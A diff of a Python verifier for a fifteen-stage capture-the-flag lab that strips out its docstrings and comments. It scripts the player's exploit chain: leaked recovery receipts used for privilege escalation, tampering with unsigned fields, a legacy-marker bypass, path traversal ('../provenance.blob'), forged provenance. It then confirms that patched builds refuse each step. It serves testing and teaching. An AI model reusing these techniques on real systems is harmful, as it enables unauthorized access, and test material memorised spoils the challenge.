@@ -1,24 +1,9 @@
 #!/usr/bin/env python3
-"""Organizer player-path verification (Requirements 3 and 4).
 
-Drives the real HTTP, WebSocket terminal and guest-agent interfaces a player
-uses — with no database edits, injected credentials or organizer role grants.
-Each stage's privilege/enrollment change is observed through the public API,
-and the Stage 03 artifact is proved to be a genuine Stage 05 key by hashing it.
 
-Two explicit scopes (Requirement 3):
 
-  --web   Application-only: Stages 01-05 plus the patched-mode regressions.
-          The Linux guest is NOT required. (`make web-chain-verify`)
 
-  (full)  Default: Stages 01-15. The Linux guest and its patched fixture are
-          MANDATORY. A missing or unreachable guest is a hard failure that
-          names the stages not executed and exits nonzero — it never prints a
-          full-chain success message. (`make chain-verify`)
 
-Run against a running stack: `make up` first (and `make vm-up` for the full
-scope).
-"""
 import base64
 import hashlib
 import hmac
@@ -55,7 +40,6 @@ ENROLL_RE = re.compile(r"Enrollment receipt: ([0-9a-f]{64})")
 
 
 def scalar(statement):
-    """Read a single value from the database (organizer-side assertions only)."""
     result = subprocess.run(
         legacy.worker.COMPOSE + ["exec", "-T", "aether-db", "sh", "-c",
             'exec psql -U "$POSTGRES_USER" -d "$POSTGRES_DB" -tA -v ON_ERROR_STOP=1'],
@@ -86,10 +70,6 @@ def operator_recovery(client, tenant, installation, receipt):
 
 
 def guest(service, command):
-    """Organizer-only: run a command as the guest operator over the VM
-    container's loopback SSH. Used solely for independent assertions (the
-    patched fixture, which no player terminal reaches) — never for a player
-    step. Player steps go through `Terminal`."""
     ssh = ("umask 077; cp /var/lib/aether-vm/operator_ed25519 /tmp/opkey; chmod 600 /tmp/opkey; "
            "exec ssh -i /tmp/opkey -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "
            "-o ConnectTimeout=5 -o LogLevel=ERROR -p 2222 operator@127.0.0.1 " + shlex.quote(command))
@@ -99,7 +79,6 @@ def guest(service, command):
 
 
 def agent_archive(service, envelope):
-    """Organizer-only independent assertion against a guest's agent."""
     body = shlex.quote(json.dumps(envelope))
     out = guest(service, "curl -s --max-time 5 -H 'Content-Type: application/json' "
                 "-d " + body + " http://127.0.0.1:8080/v1/legacy/archive")
@@ -116,14 +95,7 @@ GUEST_MISSING = ("full-chain verification requires the Linux guest, but the term
 
 
 class Terminal:
-    """The player's own browser terminal: one authenticated WebSocket to the
-    API's /api/lab/terminal, bridged to the guest operator PTY.
 
-    Each `run` wraps the command in delimiters printed by the shell itself.
-    The marker text is assembled by printf from two arguments, so the PTY echo
-    of the typed line ("BV_END_ <tag>") can never match the real output line
-    ("BV_END_<tag>:<status>"). stdin is closed for the command so it cannot
-    swallow later input."""
 
     def __init__(self, cookie):
         self.socket, status, self.buffered = vmverify.connect_websocket(cookie, ORIGIN)
@@ -174,12 +146,6 @@ HARBOR = "9a8b7c6d-5e4f-4321-8abc-def012345678"
 
 
 def indexer_probe(tenant_uuid, marker):
-    """A single `python3 -c` command that sends one legacy-envelope/0 record to
-    the in-guest indexer (127.0.0.1:9090) and prints its raw JSON reply. `marker`
-    is a Python byte expression for the trailing origin-marker byte. The program
-    is base64-wrapped so it survives the WebSocket terminal and organizer SSH
-    without any quoting hazard. This is the record a player crafts after reversing
-    the binary; the verifier does not read any organizer secret to build it."""
     prog = (
         "import socket\n"
         f"p=b'{tenant_uuid}'+bytes([{marker}])\n"
@@ -201,9 +167,6 @@ PROV_SOCKET = "aether-prov"
 
 
 def provisioner_probe(socket_epoch, request_json):
-    """A single `python3 -c` command that connects to the provisioner's per-boot
-    abstract unix socket (@aether-prov.<socket_epoch>) and sends one JSON request
-    line, printing the reply. base64-wrapped for the terminal and SSH."""
     prog = (
         "import socket\n"
         f"a='\\0{PROV_SOCKET}.{socket_epoch}'\n"
@@ -223,18 +186,13 @@ def provisioner_probe(socket_epoch, request_json):
 
 
 def boot_epoch(text):
-    """First 8 hex of a boot_id string (the provisioner's handshake epoch)."""
     line = text.strip().splitlines()[-1].strip() if text.strip() else ""
     return line.replace("-", "")[:8]
 
 
 def agent_post_probe(path, body_json):
-    """A single `python3 -c` command that POSTs a JSON body to an agent endpoint
-    (127.0.0.1:8080) and prints the reply body (including error bodies).
-    base64-wrapped for the terminal and SSH."""
     prog = (
         "import urllib.request,urllib.error\n"
-        # Double-encode so the body embeds as a Python string literal, not a dict.
         f"body={json.dumps(json.dumps(body_json))}.encode()\n"
         f"req=urllib.request.Request('http://127.0.0.1:8080{path}',data=body,"
         "headers={'Content-Type':'application/json'},method='POST')\n"
@@ -248,7 +206,6 @@ def agent_post_probe(path, body_json):
 
 
 def reach_tenant_admin(player, tenant):
-    """Stage 01 → Stage 02: ordinary signup to tenant_admin via discoverable evidence."""
     _, csv = legacy.report(player, tenant, 4101)
     match = RECEIPT_RE.search(csv)
     require(match is not None and NORTH in csv, "stage 01 handover evidence missing")
@@ -264,25 +221,21 @@ def run(web=False):
          if line.startswith("AETHER_IDENTITY_MODE=")), "challenge")
     profiles = []
     try:
-        # ---- Challenge mode: the playable chain ----
         legacy.switch("challenge")
         player, profile = signup(profiles, "Chain")
         tenant, uid = profile["tenant_id"], profile["id"]
 
-        # Stage 03 is administrator-only: an ordinary operator cannot read migration history.
         status, _ = player.request(f"/api/v2/tenant/migration?legacy_tenant_no={PLATFORM_INSTALLATION}")
         require(status == 403, "stage 03 migration endpoint open to ordinary operators")
 
         reach_tenant_admin(player, tenant)
 
-        # Stage 03a: own settings view discloses only the caller's canonical identity.
         status, settings = player.request("/api/v2/tenant")
         require(status == 200 and settings["tenant_uuid"] == tenant, "tenant settings unavailable")
         require(settings["archive_enabled"] is False, "fresh workspace already archive-enrolled")
         own_number = settings["legacy_tenant_no"]
         require(own_number >= 4102, f"player tenant number {own_number} collides with archive identifiers")
 
-        # Stage 03b: unbound migration read reconstructs the platform-operator artifact.
         status, body = player.request(f"/api/v2/tenant/migration?legacy_tenant_no={PLATFORM_INSTALLATION}")
         require(status == 200 and body["records"], "stage 03 disclosed no platform-operator record")
         detail = body["records"][0]["detail"]
@@ -293,16 +246,13 @@ def run(web=False):
         require(match is not None, "platform-operator recovery receipt not reconstructable")
         po_receipt = match.group(1)
 
-        # Organizer-side proof: the reconstructed receipt is the real Stage 05 key.
         stored = scalar(f"SELECT encode(token_hash,'hex') FROM platform_operator_recovery_receipts WHERE installation_no={PLATFORM_INSTALLATION};")
         require(hashlib.sha256(po_receipt.encode()).hexdigest() == stored,
                 "reconstructed receipt does not match the stored platform-operator hash")
 
-        # Stage 03c: reading the caller's own number discloses nothing foreign.
         status, own = player.request(f"/api/v2/tenant/migration?legacy_tenant_no={own_number}")
         require(status == 200 and own["records"] == [], "player's own migration history unexpectedly populated")
 
-        # The reconstruction grants no privilege and no enrollment.
         _, me = player.request("/api/me")
         require(me["role"] == "tenant_admin", "stage 03 changed the caller's role")
         status, _ = player.request("/api/lab/terminal")
@@ -316,8 +266,6 @@ def run(web=False):
         print("PASS: challenge stage 03 — signup → stage 01 → stage 02 → stage 03; "
               "platform-operator receipt reconstructed and hash-verified, no privilege gained.", flush=True)
 
-        # ---- Stage 04: reporting-identity enrollment ----
-        # Reconstruct the reporting-enrollment receipt from installation 4101 (Stage 03 flaw).
         status, body = player.request("/api/v2/tenant/migration?legacy_tenant_no=4101")
         require(status == 200 and body["records"], "stage 04 reporting record not reconstructable")
         reporting_receipt = next((ENROLL_RE.search(r["detail"]).group(1)
@@ -325,15 +273,12 @@ def run(web=False):
                                   if r["revision"] == "RP-22" and ENROLL_RE.search(r["detail"])), None)
         require(reporting_receipt is not None, "reporting enrollment receipt not found in installation 4101")
 
-        # Before enrollment, the worker→agent archive path is closed.
         status, _ = player.request("/api/reports", "POST", {"type": "legacy-archive"})
         require(status == 403, "unenrolled workspace could queue legacy-archive")
 
-        # Input boundaries: invalid receipt and wrong installation are refused.
         require(enroll(player, tenant, 4101, "0" * 64)[0] == 403, "enrollment accepted an invalid receipt")
         require(enroll(player, tenant, 9999, reporting_receipt)[0] == 403, "enrollment accepted a wrong installation")
 
-        # Challenge enrollment with North Works' receipt succeeds for the player's own tenant.
         status, _ = enroll(player, tenant, 4101, reporting_receipt)
         require(status == 204, f"stage 04 enrollment failed: {status}")
 
@@ -343,14 +288,11 @@ def run(web=False):
         require(me["archive_enabled"] is True and me["role"] == "tenant_admin",
                 "stage 04 changed role or did not enroll")
 
-        # legacy-archive is now queueable; the slot is empty, so queueability is the gate.
         status, _ = player.request("/api/reports", "POST", {"type": "legacy-archive"})
         require(status == 202, "enrolled workspace could not queue legacy-archive")
 
-        # Enrollment is single-use per workspace.
         require(enroll(player, tenant, 4101, reporting_receipt)[0] == 409, "workspace enrolled twice")
 
-        # Terminal is still denied: enrollment grants no role.
         status, _ = player.request("/api/lab/terminal")
         require(status == 403, "stage 04 granted terminal access")
 
@@ -362,40 +304,30 @@ def run(web=False):
         print("PASS: challenge stage 04 — reporting-identity enrollment via a foreign installation "
               "receipt; svc:aether-reporting enrolled, legacy-archive opened, no role gained.", flush=True)
 
-        # ---- Stage 05: operator recovery (tenant_admin → system_admin) ----
-        # Ordinary operators cannot call operator recovery at all.
         stray, stray_profile = signup(profiles, "Stray")
         require(operator_recovery(stray, stray_profile["tenant_id"], PLATFORM_INSTALLATION, po_receipt)[0] == 403,
                 "operator recovery open to ordinary operators")
 
-        # Stage 04 is a real prerequisite: a tenant_admin that reconstructed the
-        # receipt (Stage 03) but did not enroll (Stage 04) is refused.
         player_b, profile_b = signup(profiles, "NoEnroll")
         reach_tenant_admin(player_b, profile_b["tenant_id"])
         require(operator_recovery(player_b, profile_b["tenant_id"], PLATFORM_INSTALLATION, po_receipt)[0] == 403,
                 "operator recovery succeeded without the reporting identity (stage 04)")
 
-        # Input boundaries with the enrolled player.
         require(operator_recovery(player, tenant, PLATFORM_INSTALLATION, "0" * 64)[0] == 403,
                 "operator recovery accepted an invalid receipt")
         require(operator_recovery(player, tenant, 9999, po_receipt)[0] == 403,
                 "operator recovery accepted a wrong installation")
 
-        # Terminal is denied immediately before elevation.
         require(player.request("/api/lab/terminal")[0] == 403, "tenant_admin unexpectedly held terminal access")
 
-        # Challenge elevation via the foreign platform-operator receipt.
         status, _ = operator_recovery(player, tenant, PLATFORM_INSTALLATION, po_receipt)
         require(status == 204, f"stage 05 operator recovery failed: {status}")
         _, me = player.request("/api/me")
         require(me["role"] == "system_admin", "stage 05 did not elevate to system_admin")
 
-        # The terminal authorization gate now distinguishes challenge completion:
-        # it no longer returns 403 (503/400/101 depend on VM/websocket, all != 403).
         require(player.request("/api/lab/terminal")[0] != 403,
                 "system_admin still denied by the terminal authorization gate")
 
-        # Single-use per account.
         require(operator_recovery(player, tenant, PLATFORM_INSTALLATION, po_receipt)[0] == 409,
                 "operator recovery redeemed twice by one account")
 
@@ -409,21 +341,15 @@ def run(web=False):
               "enrollment, elevates once to system_admin, and opens the terminal authz gate.", flush=True)
 
         if web:
-            # Application-only scope: the Linux guest (Stages 06-08) is out of
-            # scope by request, not skipped by failure. `make chain-verify`
-            # covers the full chain and requires the guest.
             print("NOTE: web scope — Stages 06-08 (Linux guest) are not part of this run; "
                   "use `make chain-verify` with the guest up for the full chain.", flush=True)
         else:
-            # ---- Stage 06: reach the restricted Linux operator shell ----
             cookie = next((c.value for c in player.cookies if c.name == "aether_session"), None)
             require(cookie is not None, "no session cookie available for the terminal")
-            # The terminal rejects a foreign origin even for a system_admin session.
             denied, status, _ = vmverify.connect_websocket(cookie, "https://untrusted.example")
             denied.close()
             require(status == 403, f"terminal accepted a foreign origin: {status}")
 
-            # Stages 06-08 run entirely inside this one player terminal session.
             terminal = Terminal(cookie)
             try:
                 out = terminal.ok("id -u; id -nG")
@@ -431,26 +357,22 @@ def run(web=False):
                 print("PASS: challenge stage 06 — the elevated player opens the restricted non-root "
                       "Linux operator shell through the terminal, with no SQL grant.", flush=True)
 
-                # ---- Stage 07: native service investigation (in the player's shell) ----
                 build = terminal.ok(f"curl -sS --max-time 5 {AGENT}/v1/build")
                 require("legacy-envelope/1" in build, f"agent build endpoint unexpected: {build!r}")
                 envelope = json.loads(terminal.ok(f"cat {CAPTURE}"))
                 require(envelope["tenant_uuid"] == NORTH and envelope["principal"] == "svc:aether-reporting"
                         and envelope["legacy_tenant_no"] == 4101,
                         "captured envelope is not the North Works reporting request")
-                # The operator holds a captured message, not the signing key or map.
                 for secret in ("/etc/aether-agent/worker.key", "/etc/aether-agent/tenant-map.csv"):
                     status, out = terminal.run(f"cat {secret}")
                     require(status != 0 and "denied" in out.lower(), f"operator could read {secret}: {out!r}")
                 print("PASS: challenge stage 07 — operator discovers the agent protocol and the retained "
                       "worker-signed capture, without the signing key or tenant map.", flush=True)
 
-                # ---- Stage 08: agent identity binding (number substitution) ----
                 post = f"curl -sS --max-time 5 -H 'Content-Type: application/json' --data-binary @- {AGENT}/v1/legacy/archive"
                 legit = json.loads(terminal.ok(f"cat {CAPTURE} | {post}"))
                 require(legit.get("resolved_legacy_tenant_no") == 4101 and "north-works" in json.dumps(legit),
                         f"captured envelope did not resolve the North Works archive: {legit}")
-                # Substitute only the unsigned number; the signature is untouched.
                 confused = json.loads(terminal.ok(
                     f"sed 's/\"legacy_tenant_no\": 4101/\"legacy_tenant_no\": 4102/' {CAPTURE} | {post}"))
                 require(confused.get("resolved_legacy_tenant_no") == 4102
@@ -459,20 +381,13 @@ def run(web=False):
                 print("PASS: challenge stage 08 — substituting only legacy_tenant_no on a valid "
                       "worker signature returns a foreign bounded archive (identity confusion).", flush=True)
 
-                # ---- Stage 09: the forgotten binary (legacy indexer compat bypass) ----
-                # Containment: the indexer transport key is not operator-readable,
-                # so the player cannot forge a modern signed record.
                 status, out = terminal.run(f"cat {INDEXER_KEY_PATH}")
                 require(status != 0 and "denied" in out.lower(),
                         f"operator could read the indexer transport key: {out!r}")
-                # The crafted legacy-envelope/0 record with the trusted-transport
-                # marker resolves a descriptor with no key (the Stage 09 defect).
                 bypass = json.loads(terminal.ok(indexer_probe(NORTH, "0xA7")))
                 require(bypass.get("resolved_tenant_uuid") == NORTH
                         and bypass.get("provisioner", {}).get("service") == "aether-provisioner",
                         f"legacy marker did not resolve a provisioning descriptor: {bypass}")
-                # Without the marker the same record is refused: it is the marker
-                # bypass, not an open endpoint.
                 nomark = json.loads(terminal.ok(indexer_probe(NORTH, "0x00")))
                 require(nomark.get("error") == "origin marker",
                         f"indexer resolved a record without the trusted marker: {nomark}")
@@ -482,24 +397,17 @@ def run(web=False):
                       "legacy-envelope/0 record carrying the trusted-transport marker resolves a "
                       "provisioning descriptor with no signing key (compat-shim bypass).", flush=True)
 
-                # ---- Stage 10: namespace labyrinth (reach the confined provisioner) ----
-                # Correlate three world-readable observations: the Stage 09
-                # descriptor (names the provisioner), the boot epoch, and the
-                # abstract socket in /proc/net/unix.
                 epoch = boot_epoch(terminal.ok("cat /proc/sys/kernel/random/boot_id"))
                 require(len(epoch) == 8, f"could not read the guest boot epoch: {epoch!r}")
                 unix = terminal.ok("cat /proc/net/unix")
                 require(f"@{PROV_SOCKET}.{epoch}" in unix,
                         "provisioner abstract socket not discoverable in /proc/net/unix")
-                # The provisioner runs in a private mount namespace: its mountinfo
-                # differs from the operator's (a Linux-internals confirming signal).
                 desc = json.loads(terminal.ok(provisioner_probe(epoch, json.dumps({"op": "describe", "epoch": epoch}))))
                 require(desc.get("ok") is True and desc.get("provision", {}).get("next") == "privileged-reader",
                         f"provisioner handshake did not return the Stage 11 reference: {desc}")
                 wrong = json.loads(terminal.ok(provisioner_probe(epoch, json.dumps({"op": "describe", "epoch": "00000000"}))))
                 require(wrong.get("error") == "handshake",
                         f"provisioner accepted a wrong boot epoch: {wrong}")
-                # Containment: the patched-mode ticket is not operator-readable.
                 status, out = terminal.run("cat /etc/aether-provisioner/ticket")
                 require(status != 0 and "denied" in out.lower(),
                         f"operator could read the provisioner ticket: {out!r}")
@@ -507,29 +415,22 @@ def run(web=False):
                       "/proc/net/unix reaches the confined provisioner over its abstract socket; "
                       "a wrong epoch is refused and the ticket stays unreadable.", flush=True)
 
-                # ---- Stage 11: the privileged reader (confined provisioning deputy) ----
                 def provision(arg):
                     return json.loads(terminal.ok(provisioner_probe(
                         epoch, json.dumps({"op": "provision", "epoch": epoch, "arg": arg}))))
-                # The deputy renders a benign template from its confined store...
                 legit = provision("default.tmpl")
                 require(legit.get("ok") is True and "store=confined" in legit.get("rendered", ""),
                         f"provision deputy did not render the default template: {legit}")
-                # ...and the Stage 11 path flaw lets it escape the store to the
-                # provenance blob — a capability the operator did not have.
                 escaped = provision("../provenance.blob")
                 require(escaped.get("ok") is True, f"provision traversal did not render the blob: {escaped}")
                 blob = json.loads(escaped["rendered"])
                 require(blob.get("format") == "provenance/1" and blob.get("sig") and blob.get("tlv")
                         and blob.get("tenant_uuid") == NORTH,
                         f"extracted provenance blob is malformed: {blob}")
-                # False root is BOUNDED: the deputy (aether-prov) is not guest root.
-                # A guest-root secret is a clean denial, not a disclosure.
                 contained = provision("../../../etc/aether-agent/worker.key")
                 require("render failed" in contained.get("error", "")
                         and "worker.key" not in json.dumps(contained),
                         f"provision deputy read a guest-root secret (containment breach): {contained}")
-                # The operator still cannot read the confined store directly.
                 status, out = terminal.run("cat /var/lib/aether-provisioner/provenance.blob")
                 require(status != 0 and "denied" in out.lower(),
                         f"operator read the confined store directly: {out!r}")
@@ -537,14 +438,10 @@ def run(web=False):
                       "confined provenance blob (privileged reader), yet cannot read guest-root secrets: "
                       "the elevation is bounded to the aether-prov service identity.", flush=True)
 
-                # ---- Stage 12: the integrity paradox (provenance verification) ----
-                # The genuine blob verifies; the agent reports the JSON identity.
                 genuine = json.loads(terminal.ok(agent_post_probe("/v1/provenance", blob)))
                 require(genuine.get("verified") is True and genuine.get("legacy_tenant_no") == 4101
                         and genuine.get("tenant_uuid") == NORTH,
                         f"genuine provenance did not verify: {genuine}")
-                # The paradox: edit the JSON identity but keep tlv+sig. The signature
-                # still covers the original TLV, yet the verifier trusts the JSON.
                 forged = dict(blob)
                 forged["legacy_tenant_no"] = 4102
                 forged["tenant_uuid"] = HARBOR
@@ -556,10 +453,6 @@ def run(web=False):
                       "but the verifier trusts the JSON fields: an edited identity with the original "
                       "signature is accepted (integrity paradox).", flush=True)
 
-                # ---- Stage 13: the broken trust chain ----
-                # Three facts from three components: the worker job_id (Stage 07
-                # capture), the forged agent-verified provenance (Stage 12), and the
-                # API migration mapping for Harbor (Stage 03).
                 manifest_request = {
                     "provenance": forged,
                     "mapping": {"tenant_uuid": HARBOR, "legacy_tenant_no": 4102},
@@ -570,7 +463,6 @@ def run(web=False):
                         and manifest.get("tenant_uuid") == HARBOR
                         and manifest.get("next") == "everything-was-logged",
                         f"trust chain did not assemble a cross-tenant manifest: {manifest}")
-                # No single fact suffices: a mismatched mapping breaks the chain.
                 broken = json.loads(terminal.ok(agent_post_probe("/v1/manifest", dict(
                     manifest_request, mapping={"tenant_uuid": NORTH, "legacy_tenant_no": 4101}))))
                 require(broken.get("error") == "trust chain broken",
@@ -579,15 +471,12 @@ def run(web=False):
                       "provenance token and the API mapping assembles a cross-tenant deployment "
                       "manifest that no single service would grant (broken distributed trust).", flush=True)
 
-                # ---- Stage 14: everything was logged (forensic reconstruction) ----
-                inc = manifest["evidence"]  # /var/lib/aether-migration/incident
+                inc = manifest["evidence"]
                 w_events = [json.loads(x) for x in terminal.ok(f"cat {inc}/worker.jsonl").splitlines() if x.startswith("{")]
                 a_events = [json.loads(x) for x in terminal.ok(f"cat {inc}/agent-trace.log").splitlines() if x.startswith("{")]
-                # Align the heartbeat present in both sources to recover the offset.
                 w_hb = next(e["ts"] for e in w_events if e.get("job") == "hb-0")
                 a_hb = next(e["gts"] for e in a_events if e.get("ref") == "hb-0")
                 offset = a_hb - w_hb
-                # The pivot: the agent resolved a tenant number the actor did not own.
                 pivot = next(e for e in a_events if e.get("resolved_no") not in (None, 4101))
                 submission = {"offset": offset, "pivot_job": pivot["job"], "pivot_number": pivot["resolved_no"]}
                 incident = json.loads(terminal.ok(agent_post_probe("/v1/incident", submission)))
@@ -595,7 +484,6 @@ def run(web=False):
                         and incident.get("next") == "the-black-veil",
                         f"incident reconstruction rejected: {incident}")
                 incident_attestation = incident["attestation"]
-                # The clock alignment matters: a wrong offset is rejected.
                 wrong = json.loads(terminal.ok(agent_post_probe("/v1/incident", dict(submission, offset=offset + 1))))
                 require(wrong.get("error") == "reconstruction incorrect",
                         f"scorer accepted a wrong offset: {wrong}")
@@ -605,11 +493,6 @@ def run(web=False):
                   "API evidence (correcting the guest clock offset and the retry) yields the pivot "
                   "and a scorer-issued incident attestation.", flush=True)
 
-            # Patched VM regression (organizer independent assertion — no player
-            # terminal reaches this fixture): the patched agent signs the number and the
-            # timestamp, so the same substitution is refused (freshness is tested independently).
-            # The patched guest is mandatory for the full chain — a missing fixture
-            # is a hard failure, not a skip.
             p_capture = guest("aether-linux-vm-patched", "cat /var/lib/aether-migration/last-archive-request.json")
             require(p_capture.strip(),
                     "patched Linux guest (aether-linux-vm-patched) is required for full-chain "
@@ -623,18 +506,12 @@ def run(web=False):
             print("PASS: patched stage 08 — the patched agent refuses the number substitution "
                   "(signature covers the number and timestamp).", flush=True)
 
-            # Patched Stage 09 (organizer independent assertion against the patched
-            # guest): the patched indexer decommissions the legacy transport, so the
-            # crafted legacy-envelope/0 record is refused outright.
             refused9 = guest("aether-linux-vm-patched", indexer_probe(NORTH, "0xA7"))
             require("decommissioned" in refused9,
                     f"patched indexer served a legacy-transport record: {refused9!r}")
             print("PASS: patched stage 09 — the patched indexer decommissions the legacy "
                   "transport; the crafted record is refused.", flush=True)
 
-            # Patched Stage 10 (organizer assertion on the patched guest): the
-            # patched provisioner ignores the world-readable boot epoch and requires
-            # a ticket, so the correlation shortcut no longer authorizes describe.
             p_epoch = boot_epoch(guest("aether-linux-vm-patched", "cat /proc/sys/kernel/random/boot_id"))
             require(len(p_epoch) == 8, f"could not read patched guest boot epoch: {p_epoch!r}")
             p_desc = guest("aether-linux-vm-patched",
@@ -644,8 +521,6 @@ def run(web=False):
             print("PASS: patched stage 10 — the patched provisioner ignores the boot epoch "
                   "and requires a ticket; the world-readable shortcut is closed.", flush=True)
 
-            # Patched Stage 11 (organizer assertion with the ticket derived from the
-            # .env agent key): even an authenticated caller cannot traverse the store.
             agent_key = next((line.split("=", 1)[1] for line in (ROOT / ".env").read_text().splitlines()
                               if line.startswith("AETHER_AGENT_KEY=")), "")
             ticket = hmac.new(bytes.fromhex(agent_key), b"aether-provisioner-ticket/v0",
@@ -661,10 +536,6 @@ def run(web=False):
             print("PASS: patched stage 11 — the patched deputy confines rendering to its store; "
                   "the traversal is refused even for an authenticated caller.", flush=True)
 
-            # Patched Stage 12 (organizer assertion on the patched guest): the
-            # patched verifier binds the identity to the signed TLV, so an edited
-            # JSON field is a mismatch. The provenance key is shared (both guests
-            # use the .env agent key), so the extracted blob verifies there too.
             p_forged = dict(blob)
             p_forged["legacy_tenant_no"] = 4102
             p_conf = json.loads(guest("aether-linux-vm-patched", agent_post_probe("/v1/provenance", p_forged)))
@@ -673,9 +544,6 @@ def run(web=False):
             print("PASS: patched stage 12 — the patched verifier derives identity from the signed "
                   "TLV and rejects JSON that disagrees.", flush=True)
 
-            # Patched Stage 13 (organizer assertion): the patched manifest resolves
-            # provenance against the signed TLV, so the forged cross-tenant token is
-            # refused before any manifest is assembled.
             p_manifest = json.loads(guest("aether-linux-vm-patched", agent_post_probe("/v1/manifest", {
                 "provenance": dict(blob, legacy_tenant_no=4102, tenant_uuid=HARBOR),
                 "mapping": {"tenant_uuid": HARBOR, "legacy_tenant_no": 4102},
@@ -686,8 +554,6 @@ def run(web=False):
             print("PASS: patched stage 13 — the patched manifest binds identity to the signed "
                   "provenance and refuses the cross-tenant assertion.", flush=True)
 
-            # ---- Stage 15: THE BLACK VEIL (final proof, isolated validator) ----
-            # The public site carries a build tag that is the proof's domain label.
             _, home = player.request("/")
             home_text = home if isinstance(home, str) else home.decode("utf-8", "replace")
             match = re.search(r'name="aether-migration-channel" content="([^"]+)"', home_text)
@@ -712,7 +578,6 @@ def run(web=False):
             require(player.request(endpoint, "POST", {"proof": bundle}) == (200, final),
                     "repeated completion not idempotent")
             require(player.request(endpoint) == (200, final), "completion not persisted")
-            # Organizer restarts services only; the same player session reads its completion.
             subprocess.run(legacy.worker.COMPOSE + ["restart", "aether-api"], cwd=ROOT,
                            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             for attempt in range(30):
@@ -732,7 +597,6 @@ def run(web=False):
             print("PASS: challenge stage 15 — player HTTPS submission, strict schema, generic rejection, "
                   "idempotence, rate bound and persisted completion after API restart.", flush=True)
 
-        # ---- Patched mode: the Stage 03 disclosure is closed ----
         legacy.switch("patched")
         status, body = player.request(f"/api/v2/tenant/migration?legacy_tenant_no={PLATFORM_INSTALLATION}")
         require(status == 200, f"patched migration read failed: {status}")
@@ -745,17 +609,11 @@ def run(web=False):
         print("PASS: patched stage 03 resolves only the caller's canonical number; "
               "no foreign migration record or receipt is disclosed.", flush=True)
 
-        # Patched Stage 04: a foreign installation's receipt cannot enroll the
-        # caller (the binding check precedes the single-use conflict, so an
-        # already-enrolled player still proves the gate fired with 403).
         require(enroll(player, tenant, 4101, reporting_receipt)[0] == 403,
                 "patched mode enrolled the caller from a foreign installation receipt")
         print("PASS: patched stage 04 binds the enrollment receipt's installation "
               "to the caller and refuses a foreign receipt.", flush=True)
 
-        # Patched Stage 05: a foreign platform-operator receipt cannot elevate the
-        # caller (binding check precedes redemption, so 403 even for the already-
-        # elevated player — the gate fired, not a role/redemption conflict).
         require(operator_recovery(player, tenant, PLATFORM_INSTALLATION, po_receipt)[0] == 403,
                 "patched mode elevated from a foreign platform-operator receipt")
         print("PASS: patched stage 05 binds the platform-operator receipt to the "
